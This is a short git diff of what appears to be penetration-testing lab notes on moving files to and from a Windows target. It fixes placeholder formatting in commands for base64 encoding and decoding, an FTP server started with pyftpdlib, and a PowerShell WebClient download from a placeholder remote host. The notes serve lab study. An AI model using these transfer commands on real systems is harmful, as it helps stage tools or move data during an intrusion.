@@ -25,14 +25,14 @@ layout:
 #### Encode
 
 ```bash
-$ cat <file> | base64 -w 0; echo
+$ cat <FILE> | base64 -w 0; echo
 ```
 
 #### Decode
 
 {% code overflow="wrap" fullWidth="false" %}
 ```powershell
-PS C:\htb> [IO.File]::WriteAllBytes("<Save Path>", [Convert]::FromBase64String("<Base64 String>"))
+PS C:\htb> [IO.File]::WriteAllBytes("<SAVE PATH>", [Convert]::FromBase64String("<Base64 String>"))
 ```
 {% endcode %}
 
@@ -104,7 +104,7 @@ $ sudo python3 -m pyftpdlib --port 21
 
 {% code overflow="wrap" %}
 ```powershell
-PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://<IP>/<FILE>', '<LOCAL FILE')
+PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://<IP>/<FILE>', '<LOCAL FILE>')
 ```
 {% endcode %}
 
